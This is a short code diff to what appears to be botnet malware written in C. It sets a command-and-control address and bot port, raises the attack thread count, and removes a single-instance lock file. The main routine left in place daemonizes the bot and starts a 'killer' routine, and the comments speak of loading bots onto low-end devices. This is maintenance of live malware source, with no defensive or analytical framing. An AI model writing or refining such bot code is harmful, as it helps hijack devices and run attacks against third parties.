@@ -27,7 +27,7 @@
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
-#define MAX_THREADS 2
+#define MAX_THREADS 3
 // recommended 2-5 (OR 1 IF LOADING LOW-END bots)
 // dont increase this too much, save resources plz
 // dont exhaust bots forever, your cnc may die sometime..
@@ -167,16 +167,6 @@ int main(int argc, char** argv) {
     static char command[1024];
     ssize_t n;
     
-    // lock file to save resources and not spam conns because of daemon
-    int lock_fd = open("/tmp/.bot_lock", O_CREAT | O_RDWR, 0600);
-    if (lock_fd < 0) {
-        exit(1);
-    }
-
-    if (flock(lock_fd, LOCK_EX | LOCK_NB) < 0) {
-        close(lock_fd);
-        exit(0);
-    }
 
     daemonize(argc, argv);
     start_killer();
@@ -233,9 +223,5 @@ int main(int argc, char** argv) {
     if (sock != -1) {
         close(sock);
     }
-    flock(lock_fd, LOCK_UN);
-    close(lock_fd);
-    unlink("/tmp/.bot_lock");
-
     return 0;
 }
